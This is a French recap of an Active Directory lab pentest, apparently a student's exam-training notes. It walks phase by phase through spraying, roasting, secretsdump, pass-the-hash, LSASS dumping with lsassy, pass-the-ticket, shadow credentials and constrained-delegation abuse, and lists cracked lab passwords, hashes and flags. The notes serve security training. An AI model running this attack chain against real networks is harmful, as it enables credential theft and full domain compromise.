# Récap chronologique — TP Celestina (commandes)

> Distillation de [discuss_gemini.md](discuss_gemini.md) (~4000 lignes).  
> **Entraînement** : mots de passe / flags peuvent différer à l'examen.  
> **Jour J** : suivre [playbooks/RUNBOOK-CHRONOLOGIQUE.md](../playbooks/RUNBOOK-CHRONOLOGIQUE.md).

---

## Contexte labo

| Paramètre | Valeur |
|-----------|--------|
| Domaine | celestina.shop |
| DC | 10.13.37.42 (DC-CELESTINA) |
| Subnet | 10.13.37.0/24 (hors .1) |
| Subnet caché | 10.37.13.0/24 |
| Compte initial | pentester / Password123! |
| Naming | WK-XXX = dernier octet IP (ex. WK-123 = .123) |
| Outil | Exegol-free, pas de BloodHound GUI |

---

## Phase 1 — Setup & validation

```bash
echo "10.13.37.42 dc-celestina.celestina.shop celestina.shop" >> /etc/hosts
echo "nameserver 10.13.37.42" > /etc/resolv.conf

nxc smb 10.13.37.0/24 -u 'pentester' -p 'Password123!'
```

**Découverte** : DC = 10.13.37.42, ~15 workstations, signing False sur WK, True sur DC.

---

## Phase 2 — BloodHound + Roasting parallèle

```bash
bloodhound-python -u 'pentester' -p 'Password123!' -d celestina.shop -ns 10.13.37.42 -c All

GetNPUsers.py celestina.shop/pentester:'Password123!' -request -format hashcat -dc-ip 10.13.37.42
GetUserSPNs.py celestina.shop/pentester:'Password123!' -request -dc-ip 10.13.37.42
```

**RDP** (pentester partout) :

```bash
nxc rdp 10.13.37.0/24 -u 'pentester' -p 'Password123!'
```

---

## Phase 3 — Hashcat

```bash
# AS-REP → j.vabre
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force
# Résultat TP : Coffee4me!

# Kerberoast → g.clooney (+ k.cedepte non cracké rockyou)
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt --force
# Résultat TP : g.clooney → CoffeeMug!1
```

**Validation** :

```bash
nxc smb 10.13.37.0/24 -u 'j.vabre' -p 'Coffee4me!'
nxc smb 10.13.37.0/24 -u 'g.clooney' -p 'CoffeeMug!1'
```

---

## Phase 4 — Partage HUB & spray défaut

```bash
nxc smb 10.13.37.123 -u 'pentester' -p 'Password123!' -M spider_plus --share HUB
smbclient //10.13.37.123/HUB -U 'pentester%Password123!' -c 'get notice.pdf'
strings notice.pdf
# Mot de passe par défaut : C3L3stin4!Us3r
```

**Spray** :

```bash
nxc smb 10.13.37.42 -u 'pentester' -p 'Password123!' --rid-brute | grep SidTypeUser | awk -F'\\' '{print $2}' | awk '{print $1}' > users.txt
nxc smb 10.13.37.0/24 -u users.txt -p 'C3L3stin4!Us3r' --continue-on-success
```

**Résultat** : `a.nozer` → **(admin)** sur WK-123 ; `d.folt` valide.

---

## Phase 5 — Admin local & PTH

```bash
secretsdump.py celestina.shop/a.nozer:'C3L3stin4!Us3r'@10.13.37.123
# Hash admin local : fafb12f22417628bb6422e9bb8686f5c

nxc smb 10.13.37.0/24 -u Administrator -H 'fafb12f22417628bb6422e9bb8686f5c' --local-auth
# (Pwn3d!) WK-123 et WK-124
```

**ipconfig** (pas de 10.37.13 sur WK-123/124 au TP blanc) :

```bash
nxc smb 10.13.37.123 -u 'a.nozer' -p 'C3L3stin4!Us3r' -x 'ipconfig'
```

---

## Phase 6 — lsassy & flag LSA

```bash
nxc smb 10.13.37.123 -u 'a.nozer' -p 'C3L3stin4!Us3r' -M lsassy
# Saved 22 Kerberos ticket(s)
# Flag vu dans sortie : flag4:CCHDFLM{DumP1nG_H45h3s_L1k3_4_B0ss}

nxc smb 10.13.37.124 -u Administrator -H 'fafb12f22417628bb6422e9bb8686f5c' --local-auth -M lsassy
# Échec : Unable to dump lsass (Defender)
```

---

## Phase 7 — Pass-The-Ticket (k.udele)

```bash
ls /root/.nxc/modules/lsassy/
export KRB5CCNAME="/root/.nxc/modules/lsassy/TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_0f882254_10.13.37.123_20260518184824.ccache"
klist

# Échec initial : nxc sur IP avec -k
# Fix : targets.txt FQDN
cat << 'EOF' > targets.txt
WK-010.celestina.shop
WK-020.celestina.shop
...
dc-celestina.celestina.shop
EOF

nxc smb targets.txt -u 'k.udele' -k -d celestina.shop --use-kcache
# [+] partout, pas de (Pwn3d!)
```

---

## Phase 8 — Shadow Credentials

**BloodHound JSON** : a.nozer → `AddKeyCredentialLink` sur k.cheh.

```bash
certipy shadow auto -u a.nozer@celestina.shop -p 'C3L3stin4!Us3r' -account k.cheh -target dc-celestina.celestina.shop
# NT hash k.cheh : 2b96340904f32f7888a232c79ea37610

nxc smb 10.13.37.0/24 -u 'k.cheh' -H '2b96340904f32f7888a232c79ea37610'
# (Pwn3d!) WK-044
```

**LAPS** sur WK-044 :

```bash
nxc smb 10.13.37.0/24 -u Administrator -H '71f14af9da1e0574fec87a153ca23114' --local-auth
# STATUS_LOGON_FAILURE ailleurs
```

---

## Phase 9 — Description LDAP & k.cedepte

```bash
grep -i '"description"' *users*.json
# k.cedepte : R3m0t3Pr1v1l3g35@H4nd!
# allowedtodelegate : HTTP/WK-155

nxc smb 10.13.37.0/24 -u 'k.cedepte' -p 'R3m0t3Pr1v1l3g35@H4nd!'
# [+] sans (Pwn3d!)
```

---

## Phase 10 — Délégation contrainte (en cours au TP)

```bash
getST.py -dc-ip 10.13.37.42 -spn cifs/WK-155.celestina.shop -impersonate Administrator 'celestina.shop/k.cedepte:R3m0t3Pr1v1l3g35@H4nd!'
# Sur Exegol : getST.py (pas impacket-getST)

export KRB5CCNAME="Administrator.ccache"
nxc smb WK-155.celestina.shop -u 'Administrator' -k --use-kcache
```

**À retester** : `-spn HTTP/WK-155.celestina.shop` si `KRB_AP_ERR_BADMATCH`.

---

## Mapping challenges ↔ phases (TP blanc)

| Challenge | Phase | Preuve technique |
|-----------|-------|------------------|
| Goût par défaut | 4 | C3L3stin4!Us3r dans notice.pdf |
| Café pas sécurisé | 3 | AS-REP j.vabre |
| CAAS | 3 | Kerberoast g.clooney |
| Passe moi le sel | 5 | PTH fafb12… |
| Secret LSA | 6 | lsassy / flag4 |
| RDP non-nécessaire | 2 | nxc rdp [+] partout |
| Décrivez précisément | 9 | description LDAP |
| Ombre | 8 | certipy shadow k.cheh |
| Chien / BloodHound | 2 | bloodhound-python -c All |
| Cible KRB | 7 | PtT k.udele |
| Libéré délivré | 10 | getST k.cedepte |
| Secret trop partagé | — | `nxc -M gpp_password` à valider |
| Pivot 10.37.13 | — | non trouvé (WK-123/124/155 single-homed) |

---

## Pièges documentés

| Problème | Solution |
|----------|----------|
| BloodHound NTLM fallback | /etc/hosts + resolv.conf → DC |
| nxc -k sur IP | Utiliser `targets.txt` FQDN + `--use-kcache` |
| nxc ldap -k sans [+] | Ajouter `-d celestina.shop --use-kcache` |
| lsassy WK-124 | Normal ; utiliser WK-123 |
| getST command not found | `getST.py` |
| SPN mismatch | HTTP/ vs cifs/ selon BloodHound |
| Hashcat fichier vide | Vérifier guillemets dans heredoc hashes |

---

## Comptes compromis (TP blanc)

| Compte | Secret | Obtention |
|--------|--------|-----------|
| pentester | Password123! | Fourni |
| j.vabre | Coffee4me! | AS-REP |
| g.clooney | CoffeeMug!1 | Kerberoast |
| a.nozer | C3L3stin4!Us3r | Spray défaut |
| k.cheh | NT 2b963409… | Shadow |
| k.cedepte | R3m0t3Pr1v1l3g35@H4nd! | description LDAP |
| k.udele | TGT volé | lsassy WK-123 |
| Administrator (local) | fafb12… | secretsdump WK-123 |

---

## Voir aussi

- [discuss_gemini.md](discuss_gemini.md) — sorties terminal complètes
- [NOTES-PENTEST-REFERENCE.md](NOTES-PENTEST-REFERENCE.md) — parallèle MegaCorp
- [notes-pentest-brutes.md](notes-pentest-brutes.md) — notes camarade
